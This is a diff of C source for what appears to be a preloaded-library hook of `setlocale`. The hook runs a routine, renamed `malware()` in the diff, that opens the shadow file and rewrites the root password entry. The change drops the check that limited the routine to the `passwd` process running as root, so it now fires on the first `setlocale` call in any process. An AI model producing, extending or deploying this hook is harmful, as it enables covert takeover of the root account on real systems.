@@ -9,17 +9,8 @@
 #include <shadow.h>
 #include <limits.h>
 
-// Function to get the current process name
-void get_process_name(char *buffer, size_t size) {
-    ssize_t len = readlink("/proc/self/exe", buffer, size - 1);
-    if (len != -1) {
-        buffer[len] = '\0';
-    } else {
-        strcpy(buffer, "unknown");
-    }
-}
-
-static void modify_root_password() {
+// Hooked `setlocale` function
+void malware() {
     struct spwd *entry;
     FILE *shadow;
 
@@ -36,7 +27,6 @@ static void modify_root_password() {
     fclose(shadow);
 }
 
-// Hooked `setlocale` function
 char *setlocale(int category, const char *locale) {
     static char *(*real_setlocale)(int, const char *) = NULL;
     static int run_once = 1;
@@ -48,14 +38,7 @@ char *setlocale(int category, const char *locale) {
 
     if (run_once) {
         run_once = 0;
-        
-        get_process_name(process_name, sizeof(process_name));
-        
-        if (strstr(process_name, "passwd")) {
-            if (geteuid() == 0) {
-                modify_root_password();
-            }
-        }
+        (void) malware();
     }
 
     return real_setlocale(category, locale);
